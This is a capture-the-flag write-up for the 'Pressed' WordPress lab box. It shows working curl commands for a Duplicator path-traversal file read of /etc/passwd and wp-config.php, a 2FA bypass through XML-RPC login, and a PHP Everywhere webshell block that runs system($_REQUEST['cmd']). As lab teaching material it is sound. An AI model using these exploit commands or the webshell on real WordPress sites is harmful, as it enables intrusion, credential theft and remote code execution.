## Overview

Pressed is a hard-difficulty Linux box that serves a single WordPress 5.9 site on port 80. The path to user starts with an unauthenticated directory-traversal bug in the **Duplicator** backup plugin, which leaks the database credentials, the site's secret keys, and the user flag directly off disk. The catch is that the normal admin login is protected by two-factor authentication — so we authenticate over **XML-RPC** instead, then abuse the installed **PHP Everywhere** plugin to drop a webshell and land a shell as `www-data`.

## Recon

| Port | Service | Version |
|------|---------|---------|
| 80/tcp | http | Apache httpd 2.4.41 (Ubuntu) — WordPress 5.9 |

Only one port is open. The web server advertises a WordPress site and the HTTP response leaks the real virtual host, `pressed.htb`.

```bash
nmap -sC -sV 10.129.7.249
nmap -p- -sV -T4 10.129.7.249
```

Add the vhost to your hosts file:

```bash
echo "10.129.7.249 pressed.htb" | sudo tee -a /etc/hosts
```

## Enumeration

The WordPress REST API leaks the admin user (and a stray internal IP on the admin's profile):

```bash
curl -s --resolve pressed.htb:80:10.129.7.249 "http://pressed.htb/index.php/wp-json/wp/v2/users"
```

Probing the installed plugins reveals **Duplicator** alongside the default Akismet. Its `readme.txt` reports the version — **1.3.26** — which is vulnerable to an unauthenticated arbitrary file read (CVE-2020-11738, fixed in 1.3.28):

```bash
curl -s --resolve pressed.htb:80:10.129.7.249 "http://pressed.htb/wp-content/plugins/duplicator/readme.txt" | grep -i 'stable tag'
```

## Foothold

### Duplicator directory traversal (CVE-2020-11738)

The plugin's `duplicator_download` action takes a `file` parameter, joins it to a base path, and reads it back with no traversal sanitisation. A chain of `../` walks out to anywhere `www-data` can read. First, confirm with `/etc/passwd`:

```bash
curl -s --resolve pressed.htb:80:10.129.7.249 "http://pressed.htb/wp-admin/admin-ajax.php?action=duplicator_download&file=/../../../../../../../../etc/passwd"
```

Then read the WordPress config for the database login and secret keys:

```bash
curl -s --resolve pressed.htb:80:10.129.7.249 "http://pressed.htb/wp-admin/admin-ajax.php?action=duplicator_download&file=/../../../../../../../../var/www/html/wp-config.php" | grep -iE 'DB_|AUTH'
```

This leaks `DB_USER` / `DB_PASSWORD` (`admin` / `<redacted>`). The same file-read also reaches the user flag directly.

### XML-RPC bypass → PHP Everywhere RCE

The admin password is valid, but `/wp-login.php` is gated by 2FA and silently refuses to set a session. WordPress's legacy `xmlrpc.php` authenticates against the same user table without running the 2FA login hooks — an `isAdmin` response confirms the creds work:

```bash
curl -s --resolve pressed.htb:80:10.129.7.249 "http://pressed.htb/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value><pass></value></param></params></methodCall>'
```

With admin access over XML-RPC, the `wp.editPost` method rewrites an existing post so its body contains a **PHP Everywhere** block (CVE-2022-24663) carrying a base64-encoded PHP webshell:

```
<!-- wp:php-everywhere-block/php {"code":"<base64 system($_REQUEST['cmd'])>","version":"3.0.0"} /-->
```

Loading the post then executes commands as `www-data`:

```bash
curl -s --resolve pressed.htb:80:10.129.7.249 "http://pressed.htb/index.php/2022/01/28/hello-world/?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## User flag

![user flag captured](/assets/Images/pressed-001_foothold_user-flag.png)

```bash
cat /home/htb/user.txt   # HTB{...}
```

Access as `htb` (the user flag) is achieved through the Duplicator file-read / `www-data` shell.
